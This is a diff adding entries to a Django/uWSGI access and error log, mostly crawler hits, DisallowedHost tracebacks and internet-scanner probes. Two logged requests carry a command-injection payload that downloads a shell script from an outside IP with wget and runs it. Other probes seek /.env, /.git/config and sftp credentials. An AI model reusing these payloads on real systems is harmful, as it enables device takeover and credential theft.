@@ -3150,3 +3150,186 @@ Bad Request: /.git/config
 [pid: 724|app: 0|req: 18/480] 167.94.146.60 () {36 vars in 465 bytes} [Sat Mar 23 15:53:40 2024] GET /log-in => generated 0 bytes in 10 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
 [pid: 731|app: 0|req: 31/481] 167.94.146.60 () {36 vars in 465 bytes} [Sat Mar 23 15:53:43 2024] GET /log-in => generated 0 bytes in 4 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
 [pid: 728|app: 0|req: 24/482] 167.94.146.60 () {36 vars in 465 bytes} [Sat Mar 23 15:53:46 2024] GET /log-in => generated 0 bytes in 15 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[pid: 728|app: 0|req: 25/483] 207.46.13.230 () {44 vars in 682 bytes} [Sat Mar 23 17:24:34 2024] GET /robots.txt => generated 58736 bytes in 138 msecs (HTTP/1.1 400) 4 headers in 172 bytes (2 switches on core 0)
+Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[pid: 728|app: 0|req: 26/484] 207.46.13.230 () {44 vars in 682 bytes} [Sat Mar 23 17:24:34 2024] GET /robots.txt => generated 58736 bytes in 30 msecs (HTTP/1.1 400) 4 headers in 172 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /sitemap_index.xml
+[pid: 732|app: 0|req: 140/485] 40.77.167.57 () {38 vars in 613 bytes} [Sat Mar 23 17:24:39 2024] GET /sitemap_index.xml => generated 58419 bytes in 46 msecs (HTTP/1.1 400) 4 headers in 172 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 141/486] 40.77.167.68 () {38 vars in 598 bytes} [Sat Mar 23 17:52:07 2024] GET /sitemap.xml.gz => generated 0 bytes in 19 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 730|app: 0|req: 88/487] 40.77.167.68 () {38 vars in 584 bytes} [Sat Mar 23 17:52:08 2024] GET /log-in/ => generated 3719 bytes in 28 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 89/488] 40.77.167.108 () {44 vars in 677 bytes} [Sat Mar 23 17:58:51 2024] GET /robots.txt => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 727|app: 0|req: 23/489] 40.77.167.108 () {44 vars in 671 bytes} [Sat Mar 23 17:58:51 2024] GET /log-in/ => generated 3719 bytes in 21 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 27/490] 40.77.167.108 () {44 vars in 677 bytes} [Sat Mar 23 17:58:51 2024] GET /robots.txt => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 90/491] 40.77.167.108 () {44 vars in 671 bytes} [Sat Mar 23 17:58:51 2024] GET /log-in/ => generated 3719 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 142/492] 52.167.144.233 () {38 vars in 604 bytes} [Sat Mar 23 17:58:59 2024] GET /sitemap.xml.gz => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 725|app: 0|req: 25/493] 52.167.144.233 () {38 vars in 590 bytes} [Sat Mar 23 17:59:01 2024] GET /log-in/ => generated 3719 bytes in 10 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 91/494] 40.77.167.20 () {38 vars in 591 bytes} [Sat Mar 23 18:09:55 2024] GET /sitemap.txt => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 731|app: 0|req: 32/495] 40.77.167.20 () {38 vars in 583 bytes} [Sat Mar 23 18:09:55 2024] GET /log-in/ => generated 3719 bytes in 15 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 61/496] 162.216.150.181 () {32 vars in 648 bytes} [Sat Mar 23 18:22:54 2024] GET /client/get_targets => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 724|app: 0|req: 19/497] 162.216.150.181 () {32 vars in 626 bytes} [Sat Mar 23 18:22:55 2024] GET /log-in/ => generated 3719 bytes in 47 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemaps.trustcrm.pl'. You may need to add 'sitemaps.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /sitemaps.xml
+[pid: 724|app: 0|req: 20/498] 40.77.167.50 () {38 vars in 607 bytes} [Sat Mar 23 18:24:37 2024] GET /sitemaps.xml => generated 58363 bytes in 212 msecs (HTTP/1.1 400) 4 headers in 172 bytes (2 switches on core 0)
+Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[pid: 732|app: 0|req: 143/499] 52.167.144.56 () {44 vars in 681 bytes} [Sat Mar 23 18:35:19 2024] GET /robots.txt => generated 58721 bytes in 54 msecs (HTTP/1.1 400) 4 headers in 172 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[pid: 732|app: 0|req: 144/500] 52.167.144.56 () {44 vars in 681 bytes} [Sat Mar 23 18:35:20 2024] GET /robots.txt => generated 58721 bytes in 32 msecs (HTTP/1.1 400) 4 headers in 172 bytes (2 switches on core 0)
+Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/daniel/projects/CRM/venv/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'sitemap.trustcrm.pl'. You may need to add 'sitemap.trustcrm.pl' to ALLOWED_HOSTS.
+Bad Request: /sitemap.xml
+[pid: 731|app: 0|req: 33/501] 40.77.167.14 () {38 vars in 600 bytes} [Sat Mar 23 18:35:30 2024] GET /sitemap.xml => generated 58332 bytes in 77 msecs (HTTP/1.1 400) 4 headers in 172 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 145/502] 52.167.144.222 () {38 vars in 594 bytes} [Sat Mar 23 18:35:36 2024] GET /sitemap.xml => generated 0 bytes in 2 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 146/503] 52.167.144.222 () {38 vars in 586 bytes} [Sat Mar 23 18:35:37 2024] GET /log-in/ => generated 3719 bytes in 18 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 28/504] 40.77.167.32 () {38 vars in 598 bytes} [Sat Mar 23 18:44:19 2024] GET /sitemaps.xml => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 29/505] 40.77.167.32 () {38 vars in 588 bytes} [Sat Mar 23 18:44:19 2024] GET /log-in/ => generated 3719 bytes in 7 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 30/506] 40.77.167.108 () {44 vars in 673 bytes} [Sat Mar 23 19:04:24 2024] GET /robots.txt => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 724|app: 0|req: 21/507] 40.77.167.108 () {44 vars in 667 bytes} [Sat Mar 23 19:04:24 2024] GET /log-in/ => generated 3719 bytes in 10 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 724|app: 0|req: 22/508] 40.77.167.7 () {38 vars in 589 bytes} [Sat Mar 23 19:04:35 2024] GET /atom.xml => generated 0 bytes in 9 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 731|app: 0|req: 34/509] 40.77.167.7 () {38 vars in 583 bytes} [Sat Mar 23 19:04:36 2024] GET /log-in/ => generated 3719 bytes in 10 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 147/510] 40.77.167.7 () {38 vars in 603 bytes} [Sat Mar 23 19:07:05 2024] GET /sitemap_index.xml => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 724|app: 0|req: 23/511] 40.77.167.7 () {38 vars in 583 bytes} [Sat Mar 23 19:07:06 2024] GET /log-in/ => generated 3719 bytes in 14 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 148/512] 40.77.167.52 () {38 vars in 608 bytes} [Sat Mar 23 19:17:16 2024] GET /sitemap_index.xml => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 724|app: 0|req: 24/513] 40.77.167.52 () {38 vars in 588 bytes} [Sat Mar 23 19:17:17 2024] GET /log-in/ => generated 3719 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 31/514] 142.93.151.49 () {42 vars in 730 bytes} [Sat Mar 23 19:25:11 2024] GET / => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 725|app: 0|req: 26/515] 142.93.151.49 () {44 vars in 780 bytes} [Sat Mar 23 19:25:14 2024] GET /log-in/ => generated 3719 bytes in 19 msecs (HTTP/1.1 200) 8 headers in 358 bytes (2 switches on core 0)
+[pid: 726|app: 0|req: 62/516] 52.167.144.181 () {38 vars in 595 bytes} [Sat Mar 23 19:31:18 2024] GET /sitemaps.xml => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 24/517] 52.167.144.181 () {38 vars in 585 bytes} [Sat Mar 23 19:31:18 2024] GET /log-in/ => generated 3719 bytes in 20 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 149/518] 5.133.192.128 () {38 vars in 530 bytes} [Sat Mar 23 21:26:31 2024] GET / => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 150/519] 5.133.192.128 () {38 vars in 544 bytes} [Sat Mar 23 21:26:31 2024] GET /log-in/ => generated 3719 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 92/520] 104.199.31.214 () {44 vars in 576 bytes} [Sat Mar 23 22:42:13 2024] GET / => generated 0 bytes in 8 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 151/521] 205.210.31.130 () {30 vars in 317 bytes} [Sat Mar 23 23:33:58 2024] GET / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 152/522] 205.210.31.130 () {30 vars in 337 bytes} [Sat Mar 23 23:33:59 2024] GET /log-in/ => generated 3719 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 153/523] 104.167.222.126 () {36 vars in 484 bytes} [Sun Mar 24 00:47:08 2024] GET /robots.txt => generated 0 bytes in 9 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 730|app: 0|req: 93/524] 104.167.222.126 () {36 vars in 477 bytes} [Sun Mar 24 00:47:08 2024] GET /log-in/ => generated 3719 bytes in 13 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 154/525] 104.167.222.126 () {34 vars in 422 bytes} [Sun Mar 24 00:47:08 2024] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 25/526] 104.167.222.126 () {36 vars in 464 bytes} [Sun Mar 24 00:47:09 2024] GET / => generated 0 bytes in 14 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 63/527] 104.167.222.126 () {56 vars in 952 bytes} [Sun Mar 24 00:51:05 2024] GET / => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 725|app: 0|req: 27/528] 104.167.222.126 () {56 vars in 966 bytes} [Sun Mar 24 00:51:05 2024] GET /log-in/ => generated 3719 bytes in 26 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 725|app: 0|req: 28/529] 40.77.167.41 () {38 vars in 584 bytes} [Sun Mar 24 01:15:55 2024] GET /log-in/ => generated 3719 bytes in 13 msecs (HTTP/1.1 200) 8 headers in 358 bytes (2 switches on core 0)
+[pid: 725|app: 0|req: 29/530] 64.62.197.126 () {36 vars in 511 bytes} [Sun Mar 24 02:15:53 2024] GET / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 43/531] 64.62.197.124 () {36 vars in 479 bytes} [Sun Mar 24 02:21:11 2024] GET /webui/ => generated 0 bytes in 8 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 26/532] 64.62.197.130 () {36 vars in 534 bytes} [Sun Mar 24 02:24:51 2024] GET /favicon.ico => generated 0 bytes in 4 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 27/533] 64.62.197.124 () {36 vars in 512 bytes} [Sun Mar 24 02:25:51 2024] GET / => generated 0 bytes in 3 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 729|app: 0|req: 36/534] 64.62.197.126 () {36 vars in 523 bytes} [Sun Mar 24 02:26:46 2024] GET / => generated 0 bytes in 10 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 32/535] 64.62.197.126 () {38 vars in 575 bytes} [Sun Mar 24 02:26:46 2024] GET /log-in/ => generated 3719 bytes in 20 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 728|app: 0|req: 33/536] 64.62.197.136 () {36 vars in 539 bytes} [Sun Mar 24 02:28:34 2024] GET /vpn/index.html => generated 0 bytes in 4 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 155/537] 165.232.115.6 () {28 vars in 292 bytes} [Sun Mar 24 02:29:16 2024] GET / => generated 0 bytes in 6 msecs (HTTP/1.0 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 64/538] 165.232.115.6 () {34 vars in 466 bytes} [Sun Mar 24 02:29:16 2024] GET /nmaplowercheck1711247356 => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 156/539] 165.232.115.6 () {36 vars in 454 bytes} [Sun Mar 24 02:29:16 2024] POST /sdk => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 157/540] 165.232.115.6 () {34 vars in 428 bytes} [Sun Mar 24 02:29:16 2024] GET /HNAP1 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 28/541] 165.232.115.6 () {34 vars in 438 bytes} [Sun Mar 24 02:29:16 2024] GET /evox/about => generated 0 bytes in 4 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 29/542] 165.232.115.6 () {34 vars in 436 bytes} [Sun Mar 24 02:29:16 2024] GET /log-in/ => generated 3719 bytes in 10 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 30/543] 165.232.115.6 () {28 vars in 292 bytes} [Sun Mar 24 02:29:16 2024] GET / => generated 0 bytes in 1 msecs (HTTP/1.0 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 31/544] 165.232.115.6 () {30 vars in 318 bytes} [Sun Mar 24 02:29:16 2024] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 731|app: 0|req: 35/545] 188.166.165.83 () {38 vars in 440 bytes} [Sun Mar 24 02:29:17 2024] POST / => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 730|app: 0|req: 94/546] 188.166.165.83 () {36 vars in 442 bytes} [Sun Mar 24 02:29:17 2024] GET /log-in/ => generated 3719 bytes in 12 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 95/547] 64.62.197.129 () {36 vars in 495 bytes} [Sun Mar 24 02:29:17 2024] GET /geoserver/web/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 65/548] 64.62.197.134 () {36 vars in 521 bytes} [Sun Mar 24 02:30:35 2024] GET /.git/config => generated 0 bytes in 2 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 158/549] 87.236.176.27 () {38 vars in 492 bytes} [Sun Mar 24 03:18:55 2024] GET / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 159/550] 87.236.176.27 () {40 vars in 543 bytes} [Sun Mar 24 03:18:55 2024] GET /log-in/ => generated 3719 bytes in 12 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 160/551] 80.94.92.60 () {36 vars in 864 bytes} [Sun Mar 24 03:23:43 2024] GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 161/552] 80.94.92.60 () {36 vars in 864 bytes} [Sun Mar 24 03:23:43 2024] GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 730|app: 0|req: 96/553] 106.75.173.226 () {34 vars in 406 bytes} [Sun Mar 24 03:30:10 2024] GET /.DS_Store => generated 0 bytes in 30 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 162/554] 106.75.173.226 () {36 vars in 453 bytes} [Sun Mar 24 03:30:10 2024] GET /log-in/ => generated 3719 bytes in 17 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 66/555] 167.94.138.34 () {30 vars in 322 bytes} [Sun Mar 24 03:37:17 2024] GET / => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 67/556] 167.94.138.34 () {36 vars in 453 bytes} [Sun Mar 24 03:37:21 2024] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 730|app: 0|req: 97/557] 167.94.138.34 () {36 vars in 465 bytes} [Sun Mar 24 03:37:24 2024] GET /log-in => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 729|app: 0|req: 37/558] 167.94.138.34 () {36 vars in 465 bytes} [Sun Mar 24 03:37:30 2024] GET /log-in => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 731|app: 0|req: 36/559] 167.94.138.34 () {36 vars in 465 bytes} [Sun Mar 24 03:37:36 2024] GET /log-in => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 68/560] 167.94.138.34 () {36 vars in 465 bytes} [Sun Mar 24 03:37:40 2024] GET /log-in => generated 0 bytes in 2 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 733|app: 0|req: 44/561] 167.94.138.34 () {36 vars in 465 bytes} [Sun Mar 24 03:37:44 2024] GET /log-in => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 163/562] 106.75.174.148 () {34 vars in 422 bytes} [Sun Mar 24 04:26:52 2024] GET /.vscode/sftp.json => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 724|app: 0|req: 25/563] 106.75.174.148 () {36 vars in 461 bytes} [Sun Mar 24 04:26:53 2024] GET /log-in/ => generated 3719 bytes in 17 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 45/564] 162.216.149.171 () {32 vars in 648 bytes} [Sun Mar 24 04:43:58 2024] GET /client/get_targets => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 46/565] 162.216.149.171 () {32 vars in 626 bytes} [Sun Mar 24 04:43:58 2024] GET /log-in/ => generated 3719 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 358 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 164/566] 35.216.191.234 () {36 vars in 395 bytes} [Sun Mar 24 05:24:29 2024] GET / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 32/567] 35.216.191.234 () {38 vars in 447 bytes} [Sun Mar 24 05:24:29 2024] GET /log-in/ => generated 3719 bytes in 12 msecs (HTTP/1.1 200) 8 headers in 358 bytes (2 switches on core 0)
+[pid: 732|app: 0|req: 165/568] 106.75.137.241 () {34 vars in 410 bytes} [Sun Mar 24 05:54:10 2024] GET /.git/config => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 733|app: 0|req: 47/569] 106.75.137.241 () {36 vars in 455 bytes} [Sun Mar 24 05:54:10 2024] GET /log-in/ => generated 3719 bytes in 11 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 729|app: 0|req: 38/570] 107.170.231.42 () {36 vars in 405 bytes} [Sun Mar 24 07:36:50 2024] GET / => generated 0 bytes in 8 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 48/571] 35.216.250.151 () {34 vars in 375 bytes} [Sun Mar 24 09:34:51 2024] GET / => generated 0 bytes in 8 msecs (HTTP/1.1 302) 8 headers in 242 bytes (2 switches on core 0)
+[pid: 733|app: 0|req: 49/572] 35.216.250.151 () {36 vars in 510 bytes} [Sun Mar 24 09:34:53 2024] GET /.git/config => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 50/573] 35.216.250.151 () {36 vars in 514 bytes} [Sun Mar 24 09:34:54 2024] GET /server-status => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 51/574] 35.216.250.151 () {36 vars in 510 bytes} [Sun Mar 24 09:34:54 2024] GET /config.json => generated 0 bytes in 9 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 733|app: 0|req: 52/575] 35.216.250.151 () {36 vars in 496 bytes} [Sun Mar 24 09:34:55 2024] GET /.env => generated 0 bytes in 1 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
